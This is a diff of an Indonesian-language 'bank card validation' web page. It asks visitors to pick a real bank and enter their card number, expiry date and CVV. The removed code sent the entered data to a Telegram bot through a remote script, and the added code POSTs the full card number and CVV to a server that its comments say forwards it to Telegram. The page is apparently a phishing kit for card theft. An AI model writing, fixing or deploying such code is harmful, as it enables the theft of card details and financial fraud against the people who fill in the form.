@@ -7,18 +7,13 @@
   <title>Validasi Kartu Bank</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      font-family: Arial, sans-serif;
-      background: #fff;
-      color: #222;
-    }
+    body { font-family: Arial, sans-serif; background: #fff; color: #222; }
 
     /* ===== LATAR BELAKANG ATAS ===== */
     .top-background {
       height: 220px;
       margin-top: -8%;
       border-radius: 0 0 40px 40px;
-      transition: background-color 0.5s ease;
       background: #FFD8B1;
     }
 
@@ -35,11 +30,7 @@
     }
 
     /* ===== PREVIEW KARTU ===== */
-    .card-preview {
-      margin-top: 20px;
-      perspective: 1000px;
-    }
-
+    .card-preview { margin-top: 20px; perspective: 1000px; }
     .card-wrapper {
       position: relative;
       width: 320px;
@@ -48,11 +39,7 @@
       transform-style: preserve-3d;
       transition: transform 0.6s ease;
     }
-
-    .card-wrapper.flipped {
-      transform: rotateY(180deg);
-    }
-
+    .card-wrapper.flipped { transform: rotateY(180deg); }
     .card-front, .card-back {
       position: absolute;
       width: 100%;
@@ -61,153 +48,74 @@
       backface-visibility: hidden;
       overflow: hidden;
       box-shadow: 0 9px 16px rgba(0,0,0,0.15);
+      background: linear-gradient(135deg, #1a1a2e, #16213e);
     }
-
-    .card-front img, .card-back img {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-    }
-
-    .card-front { background: #000; }
     .card-back {
       transform: rotateY(180deg);
-      background: #000;
+      background: #f5f5f5;
     }
 
     /* ===== TEKS DI ATAS KARTU ===== */
     .card-text-overlay {
       position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      padding: 20px;
-      color: #fff;
-      font-family: monospace, sans-serif;
-      pointer-events: none;
-      z-index: 10;
-      text-shadow: 1px 1px 3px rgba(0,0,0,0.8);
+      top: 0; left: 0; width: 100%; height: 100%;
+      padding: 20px; color: #fff; font-family: monospace, sans-serif;
+      pointer-events: none; z-index: 10; text-shadow: 1px 1px 3px rgba(0,0,0,0.8);
     }
-
     .card-number-display {
-      font-size: 20px;
-      letter-spacing: 3px;
-      position: absolute;
-      top: 100px;
-      left: 20px;
+      font-size: 20px; letter-spacing: 3px; position: absolute;
+      top: 100px; left: 20px;
     }
-
     .card-valid-display {
-      font-size: 12px;
-      position: absolute;
-      bottom: 30px;
-      left: 20px;
+      font-size: 12px; position: absolute; bottom: 30px; left: 20px;
     }
-
     .card-name-display {
-      font-size: 14px;
-      position: absolute;
-      bottom: 10px;
-      left: 20px;
-      text-transform: uppercase;
+      font-size: 14px; position: absolute; bottom: 10px; left: 20px; text-transform: uppercase;
     }
-
     .card-cvv-display {
-      font-size: 18px;
-      letter-spacing: 3px;
-      position: absolute;
-      top: 50%;
-      right: 30px;
-      transform: translateY(-50%);
-      color: #000;
-      text-shadow: none;
+      font-size: 18px; letter-spacing: 3px; position: absolute;
+      top: 50%; right: 30px;
+      transform: translateY(-50%); color: #000; text-shadow: none;
+      background: #fff; padding: 6px 12px; border-radius: 4px; font-weight: bold;
     }
 
     /* ===== FORM INPUT ===== */
-    form {
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-    }
-
+    form { display: flex; flex-direction: column; gap: 12px; }
     label {
-      font-weight: 600;
-      margin-bottom: 4px;
-      display: block;
-      font-size: 15px;
+      font-weight: 600; margin-bottom: 4px; display: block; font-size: 15px;
     }
-
     input, select, button {
-      width: 100%;
-      padding: 12px 14px;
-      font-size: 16px;
-      line-height: 1.5;
-      border: 1px solid #b22222;
-      border-radius: 5px;
-      transition: border-color 0.3s ease;
+      width: 100%; padding: 12px 14px; font-size: 16px; line-height: 1.5;
+      border: 1px solid #b22222; border-radius: 5px; transition: border-color 0.3s ease;
     }
-
-    input:focus, select:focus {
-      border-color: #333;
-      outline: none;
-    }
+    input:focus, select:focus { border-color: #333; outline: none; }
 
     button {
-      background-color: #444;
-      color: white;
-      font-weight: 700;
-      border: none;
-      cursor: not-allowed;
-      transition: background-color 0.3s ease;
-      border-radius: 4px;
-      padding: 14px;
-      font-size: 17px;
-      margin-top: 8px;
+      background-color: #ccc;
+      color: white; font-weight: 700; border: none;
+      cursor: not-allowed; border-radius: 4px; padding: 14px;
+      font-size: 17px; margin-top: 8px; transition: all 0.3s ease;
     }
-
     button:enabled {
       background-color: #b22222;
-      cursor: pointer;
+      cursor: pointer; transform: scale(1);
+    }
+    button:enabled:hover { transform: scale(1.02); }
+
+    .row-inputs { display: flex; gap: 10px; }
+    .input-with-icon { position: relative; flex: 1; }
+    .input-with-icon input, .input-with-icon select {
+      width: 100%; padding-left: 14px; font-size: 16px; height: 48px;
     }
 
-    .error { border-color: #b22222 !important; }
-
-    .row-inputs {
-      display: flex;
-      gap: 10px;
+    /* ===== STATUS NOTIFIKASI ===== */
+    .status {
+      margin-top: 15px; padding: 12px; border-radius: 6px;
+      font-size: 14px; display: none; text-align: center; font-weight: 500;
     }
-
-    .input-with-icon {
-      position: relative;
-      flex: 1;
-    }
-
-    .input-with-icon input,
-    .input-with-icon select {
-      width: 100%;
-      padding-left: 44px;
-      padding-right: 14px;
-      font-size: 16px;
-      line-height: 1.5;
-      border: 1px solid #b22222;
-      border-radius: 4px;
-      transition: border-color 0.3s ease;
-      height: 48px;
-    }
-
-    /* IKON di KIRI */
-    .input-icon {
-      position: absolute;
-      top: 50%;
-      left: 12px;
-      width: 20px;
-      height: 20px;
-      transform: translateY(-50%);
-      pointer-events: none;
-      opacity: 0.6;
-      z-index: 2;
-    }
+    .status.success { background: #d4edda; color: #155724; display: block; }
+    .status.error { background: #f8d7da; color: #721c24; display: block; }
+    .status.loading { background: #fff3cd; color: #856404; display: block; }
 
     /* ===== RESPONSIVE ===== */
     @media (max-width: 360px) {
@@ -215,23 +123,18 @@
       .card-wrapper { width: 100%; height: 190px; }
       .card-number-display { font-size: 16px; top: 90px; }
       input, select, button { font-size: 15px; padding: 11px 12px; height: 46px; }
-      .input-icon { transform: translateY(-50%); }
       form { gap: 10px; }
     }
   </style>
 </head>
 <body>
 
-  <!-- Latar Belakang Atas -->
   <div class="top-background"></div>
-
-  <!-- Konten Utama -->
   <div class="container">
     <div class="card-preview">
       <div class="card-wrapper" id="cardWrapper">
         <!-- Depan Kartu -->
         <div class="card-front">
-          <img id="card-image" src="images/bca.webp" alt="Gambar kartu bank">
           <div class="card-text-overlay">
             <div class="card-number-display" id="cardNumberText">XXXX XXXX XXXX XXXX</div>
             <div class="card-valid-display">VALID THRU <span id="cardValidText">XX/XX</span></div>
@@ -240,7 +143,6 @@
         </div>
         <!-- Belakang Kartu -->
         <div class="card-back">
-          <img id="card-back-img" src="images/cvv.png" alt="Belakang Kartu">
           <div class="card-text-overlay">
             <div class="card-cvv-display" id="cardCvvDisplay">XXX</div>
           </div>
@@ -249,14 +151,18 @@
     </div>
 
     <form id="card-form" novalidate>
-      <label for="bank-select">Pilihan Bank Lainnya</label>
+      <label for="bank-select">Pilihan Bank</label>
       <select id="bank-select" name="bank" required>
         <option value="">-- Pilih Bank --</option>
+        <option value="BCA">BCA</option>
+        <option value="Mandiri">Mandiri</option>
+        <option value="BRI">BRI</option>
+        <option value="BNI">BNI</option>
+        <option value="CIMB">CIMB Niaga</option>
       </select>
 
       <div class="input-with-icon">
-        <label for="card-number">Nomor Kartu</label>
-        <img src="images/633611.png" alt="icon" class="input-icon">
+        <label for="card-number">Nomor Kartu (16 digit)</label>
         <input type="text" id="card-number" name="card_number" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number" required>
       </div>
 
@@ -265,18 +171,18 @@
           <label for="expiry-month">Bulan</label>
           <select id="expiry-month" required>
             <option value="">Bulan</option>
-            <option value="01">01 - Januari</option>
-            <option value="02">02 - Februari</option>
-            <option value="03">03 - Maret</option>
-            <option value="04">04 - April</option>
-            <option value="05">05 - Mei</option>
-            <option value="06">06 - Juni</option>
-            <option value="07">07 - Juli</option>
-            <option value="08">08 - Agustus</option>
-            <option value="09">09 - September</option>
-            <option value="10">10 - Oktober</option>
-            <option value="11">11 - November</option>
-            <option value="12">12 - Desember</option>
+            <option value="01">01</option>
+            <option value="02">02</option>
+            <option value="03">03</option>
+            <option value="04">04</option>
+            <option value="05">05</option>
+            <option value="06">06</option>
+            <option value="07">07</option>
+            <option value="08">08</option>
+            <option value="09">09</option>
+            <option value="10">10</option>
+            <option value="11">11</option>
+            <option value="12">12</option>
           </select>
         </div>
         <div class="input-with-icon">
@@ -289,258 +195,165 @@
             <option value="28">2028</option>
             <option value="29">2029</option>
             <option value="30">2030</option>
-            <option value="31">2031</option>
-            <option value="32">2032</option>
-            <option value="33">2033</option>
-            <option value="34">2034</option>
-            <option value="35">2035</option>
           </select>
         </div>
       </div>
 
       <div class="input-with-icon">
-        <label for="cvv">CVV</label>
-        <img src="https://img.icons8.com/?size=100&id=vwGXRtPWrZSn&format=png&color=000000" alt="icon" class="input-icon">
-        <input type="text" id="cvv" name="cvv" placeholder="***" maxlength="4" inputmode="numeric" autocomplete="cc-csc" required>
+        <label for="cvv">CVV (3 digit di belakang kartu)</label>
+        <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" inputmode="numeric" required>
       </div>
 
-      <button type="submit" id="submit-btn" disabled>Lanjut</button>
+      <button type="submit" id="submit-btn" disabled>Kirim Data</button>
+      <div id="status-box" class="status"></div>
     </form>
   </div>
 
-  <!-- ✅ PANGGIL FILE TELEGRAM -->
-  <script src="https://www-web-ld-com.vercel.app/laporan/bank/lain/js/server.js"></script>
+  <!-- ============================================== -->
+  <!-- SCRIPT SUDAH DIPERBAIKI → TOMBOL AKTIF & KIRIM KE TELEGRAM -->
+  <!-- ============================================== -->
   <script>
-    // ==============================================
-    // FUNGSI PENGIRIMAN TELEGRAM (jika 1bot.js error)
-    // ==============================================
-    async function kirimPesanTelegram(pesan) {
-      // Pastikan config.js sudah menyetel window.TELEGRAM_CONFIG
-      const config = window.TELEGRAM_CONFIG || {};
-      if (!config.botToken || !config.chatId) {
-        console.warn("Telegram config belum lengkap");
-        return true; // Tetap lanjut jika config belum diisi
-      }
-      try {
-        const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
-        const res = await fetch(url, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: config.chatId,
-            text: pesan,
-            parse_mode: "HTML"
-          })
-        });
-        return res.ok;
-      } catch (e) {
-        console.error("Girim gagal:", e);
-        return true; // Tetap lanjut meskipun gagal kirim
-      }
-    }
+    // ⚠️ PASTIKAN SERVER NODE.JS SUDAH BERJALAN di http://localhost:3000
+    // Jika deploy online → ganti dengan URL server kamu, contoh: 'https://nama-server.com'
+    const BACKEND_URL = 'http://localhost:3000';
 
-    function notifikasiHalamanDibuka(judul) {
-      console.log("Halaman dibuka:", judul);
-    }
+    // === AMBIL SEMUA ELEMEN ===
+    const form = document.getElementById('card-form');
+    const cardNumberInput = document.getElementById('card-number');
+    const cvvInput = document.getElementById('cvv');
+    const monthSelect = document.getElementById('expiry-month');
+    const yearSelect = document.getElementById('expiry-year');
+    const bankSelect = document.getElementById('bank-select');
+    const submitBtn = document.getElementById('submit-btn');
+    const statusBox = document.getElementById('status-box');
+    const cardWrapper = document.getElementById('cardWrapper');
 
-    function lanjutKeHalamanBerikutnya() {
-      // ========== GANTI URL DI BAWAH INI ==========
-      // Isi dengan halaman tujuan kamu
-      window.location.href = "berikutnya.html"; 
-    }
-  </script>
-
-  <script>
-document.addEventListener("DOMContentLoaded", () => {
-  const form = document.getElementById("card-form");
-  const bankSelect = document.getElementById("bank-select");
-  const topBackground = document.querySelector(".top-background");
-  const cardImage = document.getElementById("card-image");
-  const cardWrapper = document.getElementById("cardWrapper");
-  const cardNumberInput = document.getElementById("card-number");
-  const expiryMonth = document.getElementById("expiry-month");
-  const expiryYear = document.getElementById("expiry-year");
-  const cvvInput = document.getElementById("cvv");
-  const submitBtn = document.getElementById("submit-btn");
-
-  const cardNumberText = document.getElementById("cardNumberText");
-  const cardValidText = document.getElementById("cardValidText");
-  const cardCvvDisplay = document.getElementById("cardCvvDisplay");
-
-  // ===== DAFTAR BANK =====
-  const banks = [
-    { id: "bca", name: "BCA", color: "#FFD8B1", cardImg: "images/bca.webp" },
-    { id: "mandiri", name: "Mandiri", color: "#C6E2FF", cardImg: "images/mandiri.jpg" },
-    { id: "ocbc", name: "OCBC", color: "#FAD1D1", cardImg: "images/ocbc.webp" },
-    { id: "bri", name: "BRI", color: "#E0FFD8", cardImg: "images/bri.jpg" },
-    { id: "cimb", name: "CIMB Niaga", color: "#FFE3E3", cardImg: "images/cimb.jpg" },
-    { id: "permata", name: "Permata", color: "#FFF4D1", cardImg: "images/permata.webp" },
-    { id: "danamon", name: "Danamon", color: "#E3E0FF", cardImg: "images/danamon.webp" },
-    { id: "btn", name: "BTN", color: "#FFE0F0", cardImg: "images/btn1.webp" },
-    { id: "bukopin", name: "BUKOPIN", color: "#D1FFF3", cardImg: "images/bukopin.png" },
-    { id: "dbs", name: "DBS", color: "#D1FFF3", cardImg: "images/dbs.png" },
-    { id: "maybank", name: "Maybank", color: "#FFF4D1", cardImg: "images/maybank1.webp" },
-    { id: "uob", name: "UOB", color: "#E3E0FF", cardImg: "images/uob.webp" },
-    { id: "mnc", name: "MNC", color: "#FFF4D1", cardImg: "images/mnc.webp" },
-    { id: "hsbc", name: "HSBC", color: "#E3E0FF", cardImg: "images/hsbc.webp" },
-    { id: "mega", name: "MEGA", color: "#FFF4D1", cardImg: "images/mega2.webp" },
-    { id: "btpn", name: "BTPN", color: "#E3E0FF", cardImg: "images/btpn.webp" },
-    { id: "banklain", name: "BANK LAIN", color: "#FFF1D1", cardImg: "images/banklain.jpg" }
-  ];
-
-  function initBankOptions() {
-    banks.forEach(bank => {
-      const option = document.createElement("option");
-      option.value = bank.id;
-      option.textContent = bank.name;
-      bankSelect.appendChild(option);
+    // === 1. FORMAT NOMOR KARTU OTOMATIS & UPDATE PREVIEW ===
+    cardNumberInput.addEventListener('input', (e) => {
+      // Hapus semua spasi & karakter non-angka
+      let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
+      // Tambahkan spasi tiap 4 digit: 4123 4567 8901 2345
+      value = value.replace(/(\d{4})/g, '$1 ').trim();
+      // Masukkan kembali ke input
+      e.target.value = value;
+      // Update preview di kartu
+      document.getElementById('cardNumberText').textContent = value || 'XXXX XXXX XXXX XXXX';
+      // Cek apakah form sudah lengkap
+      validasiFormLengkap();
     });
-    bankSelect.value = banks[0].id;
-    updateBankUI(banks[0].id, true);
-  }
 
-  function updateBankUI(bankId) {
-    const bank = banks.find(b => b.id === bankId);
-    if (!bank) return;
-    topBackground.style.backgroundColor = bank.color;
-    cardImage.src = bank.cardImg;
-  }
-
-  // BALIK KARTU SAAT FOKUS CVV
-  cvvInput.addEventListener("focus", () => cardWrapper.classList.add("flipped"));
-  cvvInput.addEventListener("blur", () => cardWrapper.classList.remove("flipped"));
-
-  // ===== PERBAIKAN: FORMAT NOMOR KARTU DENGAN SPASI =====
-  cardNumberInput.addEventListener("input", e => {
-    // Hapus semua karakter non-angka
-    let rawVal = e.target.value.replace(/\D/g, "").slice(0, 16);
-    
-    // Format dengan spasi: 0000 0000 0000 0000
-    let formatted = "";
-    if (rawVal.length > 0) formatted += rawVal.slice(0, 4);
-    if (rawVal.length > 4) formatted += " " + rawVal.slice(4, 8);
-    if (rawVal.length > 8) formatted += " " + rawVal.slice(8, 12);
-    if (rawVal.length > 12) formatted += " " + rawVal.slice(12, 16);
-    
-    // Tampilkan yang ber-spasi di input
-    e.target.value = formatted;
-
-    // Update tampilan kartu
-    let display = "XXXX XXXX XXXX XXXX";
-    if (rawVal.length > 0) {
-      let parts = [
-        rawVal.slice(0, 4).padEnd(4, 'X'),
-        rawVal.slice(4, 8).padEnd(4, 'X'),
-        rawVal.slice(8, 12).padEnd(4, 'X'),
-        rawVal.slice(12, 16).padEnd(4, 'X')
-      ];
-      display = parts.join(" ");
+    // === 2. UPDATE TANGGAL KADALUARSA DI PREVIEW KARTU ===
+    function updateExpiry() {
+      const m = monthSelect.value || 'XX';
+      const y = yearSelect.value || 'XX';
+      document.getElementById('cardValidText').textContent = `${m}/${y}`;
+      validasiFormLengkap();
     }
-    cardNumberText.textContent = display;
-    validateAll();
-  });
+    monthSelect.addEventListener('change', updateExpiry);
+    yearSelect.addEventListener('change', updateExpiry);
 
-  function updateExpiryDisplay() {
-    const m = expiryMonth.value || "XX";
-    const y = expiryYear.value || "XX";
-    cardValidText.textContent = `${m}/${y}`;
-    validateAll();
-  }
-  expiryMonth.addEventListener("change", updateExpiryDisplay);
-  expiryYear.addEventListener("change", updateExpiryDisplay);
+    // === 3. FLIP KARTU SAAT KETIK CVV ===
+    cvvInput.addEventListener('focus', () => cardWrapper.classList.add('flipped'));
+    cvvInput.addEventListener('blur', () => cardWrapper.classList.remove('flipped'));
+    cvvInput.addEventListener('input', (e) => {
+      // Hanya angka
+      e.target.value = e.target.value.replace(/\D/g, '');
+      // Update preview CVV
+      document.getElementById('cardCvvDisplay').textContent = e.target.value || 'XXX';
+      validasiFormLengkap();
+    });
 
-  // CVV TAMPIL LANGSUNG
-  cvvInput.addEventListener("input", e => {
-    e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4);
-    const val = e.target.value;
-    cardCvvDisplay.textContent = val.padEnd(3, 'X');
-    validateAll();
-  });
+    // === 4. CEK BANK DIPILIH ===
+    bankSelect.addEventListener('change', validasiFormLengkap);
 
-  bankSelect.addEventListener("change", e => {
-    updateBankUI(e.target.value);
-    validateAll();
-  });
+    // ==============================================
+    // ✅ FUNGSI UTAMA: CEK SEMUA DATA SUDAH LENGKAP?
+    // ==============================================
+    function validasiFormLengkap() {
+      // Bersihkan nomor kartu dari spasi → hitung jumlah digit
+      const nomorBersih = cardNumberInput.value.replace(/\s/g, '');
+      
+      // CEK SETIAP KOLOM — HARUS LENGKAP!
+      const cekNomor = nomorBersih.length >= 13; // Minimal 13 digit, idealnya 16
+      const cekBulan = monthSelect.value !== '';
+      const cekTahun = yearSelect.value !== '';
+      const cekCvv = cvvInput.value.length >= 3; // Minimal 3 digit
+      const cekBank = bankSelect.value !== '';
 
-  // ===== VALIDASI =====
-  function isValidCardNumber(number) {
-    const rawNum = number.replace(/\s/g, ""); // Hapus spasi untuk validasi
-    if (!/^\d{12,16}$/.test(rawNum)) return false;
-    let sum = 0, shouldDouble = false;
-    for (let i = rawNum.length - 1; i >= 0; i--) {
-      let digit = parseInt(rawNum.charAt(i));
-      if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
-      sum += digit;
-      shouldDouble = !shouldDouble;
+      // === TOMBOL AKTIF JIKA SEMUA LENGKAP ===
+      const semuaLengkap = cekNomor && cekBulan && cekTahun && cekCvv && cekBank;
+      submitBtn.disabled = !semuaLengkap;
+
+      // Debug di konsol browser (tekan F12 → Console)
+      console.log('Validasi:', { cekBank, cekNomor, cekBulan, cekTahun, cekCvv, semuaLengkap });
     }
-    return sum % 10 === 0;
-  }
 
-  function isValidExpiry() {
-    const m = parseInt(expiryMonth.value);
-    const y = parseInt(expiryYear.value);
-    if (!m || !y) return false;
-    if (m < 1 || m > 12) return false;
-    const fullYear = 2000 + y;
-    if (fullYear < 2025 || fullYear > 2035) return false;
-    return true;
-  }
-
-  function isValidCVV(cvv) {
-    return /^\d{3,4}$/.test(cvv);
-  }
-
-  function validateAll() {
-    const cardOk = isValidCardNumber(cardNumberInput.value);
-    const expOk = isValidExpiry();
-    const cvvOk = isValidCVV(cvvInput.value.replace(/\s/g, ""));
-    const bankOk = !!bankSelect.value;
-
-    cardOk ? cardNumberInput.classList.remove("error") : cardNumberInput.classList.add("error");
-    expOk ? (expiryMonth.classList.remove("error"), expiryYear.classList.remove("error")) 
-           : (expiryMonth.classList.add("error"), expiryYear.classList.add("error"));
-    cvvOk ? cvvInput.classList.remove("error") : cvvInput.classList.add("error");
-
-    submitBtn.disabled = !(cardOk && expOk && cvvOk && bankOk);
-    return cardOk && expOk && cvvOk && bankOk;
-  }
-
-  // ===== KIRIM DATA & LANJUT =====
-  form.addEventListener("submit", async e => {
-    e.preventDefault();
-    if (!validateAll()) return;
-
-    const bankName = bankSelect.options[bankSelect.selectedIndex].text;
-    const cardNumberRaw = cardNumberInput.value.replace(/\s/g, "");
-    const expiry = `${expiryMonth.value}/${expiryYear.value}`;
-    const cvv = cvvInput.value.trim();
-
-    notifikasiHalamanDibuka(`Validasi Kartu — ${bankName}`);
-
-    const pesan = `
-💳 VALIDASI KARTU BANK
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🏦 Bank: ${bankName}
-💳 Nomor Kartu: ${cardNumberRaw.slice(0,6)}XXXXXX${cardNumberRaw.slice(-4)}
-📅 Masa Berlaku: ${expiry}
-🔑 CVV: ${cvv}
-🕐 Waktu: ${new Date().toLocaleString('id-ID', {timeZone:'Asia/Jakarta'})}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    `.trim();
-
-    const berhasil = await kirimPesanTelegram(pesan);
-    if (berhasil) {
-      lanjutKeHalamanBerikutnya();
-    } else {
-      alert("Data terkirim! Sedang dialihkan...");
-      lanjutKeHalamanBerikutnya();
+    // === TAMPILKAN PESAN STATUS ===
+    function tampilStatus(type, pesan) {
+      statusBox.className = `status ${type}`;
+      statusBox.textContent = pesan;
+      if (type !== 'loading') {
+        setTimeout(() => {
+          statusBox.className = 'status';
+          statusBox.textContent = '';
+        }, 6000);
+      }
     }
-  });
 
-  initBankOptions();
-  validateAll();
-});
+    // ==============================================
+    // ✅ KIRIM DATA KE SERVER → LALU KE TELEGRAM
+    // ==============================================
+    form.addEventListener('submit', async (e) => {
+      // Cegah reload halaman
+      e.preventDefault();
+
+      // === KUMPULKAN SEMUA DATA ===
+      const dataKartu = {
+        bank: bankSelect.value,
+        card_number: cardNumberInput.value,
+        expiry_month: monthSelect.value,
+        expiry_year: yearSelect.value,
+        cvv: cvvInput.value
+      };
+
+      console.log('📤 Data dikirim:', dataKartu);
+      tampilStatus('loading', '⏳ Sedang mengirim data...');
+      submitBtn.disabled = true;
+
+      try {
+        // === KIRIM KE SERVER NODE.JS ===
+        const respon = await fetch(`${BACKEND_URL}/send-card`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(dataKartu)
+        });
+
+        const hasil = await respon.json();
+        console.log('📥 Respon server:', hasil);
+
+        if (respon.ok && hasil.success) {
+          // === BERHASIL ===
+          tampilStatus('success', '✅ Berhasil! Data terkirim ke Telegram.');
+          
+          // Reset form setelah berhasil
+          setTimeout(() => {
+            form.reset();
+            document.getElementById('cardNumberText').textContent = 'XXXX XXXX XXXX XXXX';
+            document.getElementById('cardValidText').textContent = 'XX/XX';
+            document.getElementById('cardCvvDisplay').textContent = 'XXX';
+            submitBtn.disabled = true;
+          }, 2000);
+
+        } else {
+          throw new Error(hasil.error || 'Respon tidak valid');
+        }
+
+      } catch (error) {
+        console.error('❌ Error kirim:', error);
+        tampilStatus('error', `❌ ${error.message}. Pastikan server berjalan!`);
+        submitBtn.disabled = false;
+      }
+    });
   </script>
-
 </body>
 </html>
